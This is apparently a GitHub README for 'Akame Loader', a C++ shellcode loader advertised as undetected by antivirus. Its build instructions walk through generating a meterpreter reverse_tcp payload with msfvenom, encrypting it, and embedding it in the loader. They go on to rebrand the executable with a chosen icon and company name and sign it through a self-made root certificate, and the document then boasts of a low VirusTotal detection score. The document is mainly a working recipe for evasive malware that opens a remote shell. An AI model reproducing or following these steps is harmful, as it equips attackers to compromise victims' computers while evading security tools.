<h1 align="center">Akame Loader</h1>
<p align="center">
  <img width="250" height="250" src="https://raw.githubusercontent.com/Wtf-Is-This-x1337/Akame-Loader/main/Images/akame.png" width="250" height="250">
</p>
<h4 align="center">An open source, UD shellcode loader written in C++17</h4>

## Details

## Build instructions
1. Generate a shellcode with metasploit<br>
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shellcode.bin <br>
2. Encrypt your shellcode with encrypt.exe <br>
mv shellcode.bin \Akame Loader\x64\Release\Resources\<br>
cd \Akame Loader\x64\Release\Resources\<br>
(optional) encrypt --help<br>
encrypt.exe -l cpp -m shellcode.bin -e random -o cli<br>
3. Copy the output and paste it under the "payload" comment<br>
Paste your IV key, your KEY and your BUFF into the existent vectors<br>
4. Change the resources<br>
Add your icon, your company name, etc.<br>
5. Build the project<br>
Language standard: ISO C++17<br>
Configuration: Release<br>
Platform: x64<br>
Runtime Library: Multi-Threaded (/MT)<br>
SubSystem: Windows<br>
Dependencies: user32.lib;advapi32.lib;crypt32.lib;<br>
6. Add a certificate to your executable<br>
move Akame.exe Resources && cd Resources<br>
makecert.exe -r -pe -n "CN=Akame CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv AkameCA.pvk AkameCA.cer<br>
certutil -user -addstore Root AkameCA.cer<br>
makecert.exe -pe -n "CN=Akame Cert" -a sha256 -cy end -sky signature -ic AkameCA.cer -iv AkameCA.pvk -sv AkameCert.pvk AkameCert.cer<br>
pvk2pfx.exe -pvk AkameCert.pvk -spc AkameCert.cer -pfx AkameCert.pfx<br>
signtool.exe sign /v /f AkameCert.pfx /t http://timestamp.digicert.com/?alg=sha1 Akame.exe<br>
! Change "Akame.exe" to whatever your executable name is<br>

## VirusTotal Scan (3/71 security vendors and no sandboxes)
I uploaded the loader to Virus Total because I don't want this to be used for malicious purposes!<br>
The shellcode used was generated with metasploit (payload: windows/x64/meterpreter/reverse_tcp) and encrypted by \resources\encrypt.exe.<br>
The loader was build with VS22 and signed with a sha1 certificate

![Virus Total](https://raw.githubusercontent.com/Wtf-Is-This-x1337/Akame-Loader/main/Images/virustotal.png)

Link: https://www.virustotal.com/gui/file/68e6a25457093584a043ed3f721be9bc9b6456edd792cb4e30054e85bdc4119f?nocache=1

## License
MIT License

Copyright (c) 2022 WtfIsThis

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
